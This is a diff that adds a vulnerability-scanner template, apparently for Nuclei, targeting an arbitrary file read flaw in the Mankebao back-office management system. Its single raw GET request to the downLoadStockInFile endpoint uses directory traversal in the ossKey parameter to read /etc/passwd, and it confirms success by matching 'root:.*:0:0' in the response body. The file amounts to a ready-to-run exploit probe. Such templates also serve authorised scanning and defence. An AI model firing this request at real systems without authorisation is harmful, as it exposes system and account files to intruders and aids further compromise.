@@ -1,0 +1,23 @@
+id: mankebao-downLoadStockInFile-File-reading
+
+info:
+  name: 满客宝后台管理系统 downLoadStockInFile 任意文件读取漏洞
+  author: xxx
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /warehouse/api/v1/stockIn/downLoadStockInFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0'
+      - type: status
+        status: 
+          - 200
